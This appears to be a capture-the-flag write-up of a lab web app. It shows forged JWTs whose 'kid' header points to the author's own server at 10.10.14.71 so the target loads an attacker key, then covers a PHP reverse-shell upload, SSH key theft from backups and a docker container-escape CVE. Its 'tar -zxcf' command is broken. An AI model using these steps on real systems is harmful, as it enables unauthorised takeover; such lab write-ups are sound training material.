# Enumeration

Nmap scan show us machine is openning these ports: `22,80,10010` 

Directory enumeration with gobuster
```
/login                (Status: 200) [Size: 1250]
/register             (Status: 200) [Size: 1422]
/admin                (Status: 403) [Size: 9]
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]
```
Visit the website, we explore the website functionality.

Register an account and login to the website

We see the website functionality is very basic, you can login and then you can add notes, view your own notes.

Viewing page source code doesn't show any interesting,

I use Burp Suite to explore the request, especially the request/response headers (my favorite place). You can tell a lot about what is running underneath based on the HTTP headers

I see they have Set-Cookie header. So every time we send a request to view notes, it uses `Cookie: auth=ey...` to identify our rights inside the website, and it is using JSON Web Token

I go to jwt.io to decrypt to token content and got this.

Token data:
```
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}

{
  "username": "r3ot",
  "email": "1@gmail.com",
  "admin_cap": 0
}
```

I am familiar with Web Application and how they work, especially the jwt authentication. But I rarely see the `kid` ( Key ID) in the JWT header, and since it is using `RS256` alg, it must be signed by a private key and the `"kid": "http://localhost:7070/privKey.key"` is showing that where the back-end get the private key from.

I did some research on what is the `kid` header and can we manipulate it ?. I ran into this [article](https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-command-injection-e7f5b9def146)

In the aricle, they mention about `kid` parameter get the private key from an absolute path point to the private key inside the machine.

But our `kid` parameter is point to a file hosted by a web server.

So we can kinda guest that, they are doing some http request to that `localhost:7070` to get the private key. Like `os.popen(curl $(kid))` , or something like that.

To test our theory to see if the website is vulnerable to that, we can generate a jwt with this value (and signed it with our private key)

```
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://10.10.14.71:8000/a.txt"
}

{
  "username": "r3ot",
  "email": "1@gmail.com",
  "admin_cap": 1
}
```

**Note**: We modify and `kid` value to our local web server ( `python -m SimpleHTTPServer` can help you spin up a web server quickly) . We also modify the `admin_cap` value to `1` since we have control over these values.

Modify the Cookie value with our token

```
auth=<our_tokens
```

And then we send our request to server. Watch our local machine logs, we did receive request from the box by modifying `kid` value => It is vulnerable 

Now it's time to take a step further. We will modify the `kid` value and point the URL to our private key and have the box fetch private key from our machine, verify the token

```
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://10.10.14.71:8000/privKey.key" // Our private key
}

{
  "username": "r3ot",
  "email": "1@gmail.com",
  "admin_cap": 1
}
```

When the web server get our private key and verify it with our private key, our token become valid => We just got the admin priviledge inside the website

Go to `/admin` , we saw a upload file function and view all notes function

Click to view all notes, we can see that they have some notes:
- One is about PHP file being executed and it's not secure
- Second is about some backups

We can upload a php reverse shell file to get our reverse shell
=> We got RCE.

# Exploit
======================================================
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
noah:x:1000:1000:Noah:/home/noah:/bin/bash

====================================================
cp home.tar.gz /tmp
tar -zxcf home.tar.gz 
COPY id_rsa private key and login
=> got user

====================================================
sudo -l
(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*

========================
Exploit: https://programmersought.com/article/71085031667/
Source code: https://github.com/Frichetten/CVE-2019-5736-PoC

Install Docker image without internet:
https://stackoverflow.com/questions/48125169/how-run-docker-images-without-connect-to-internet
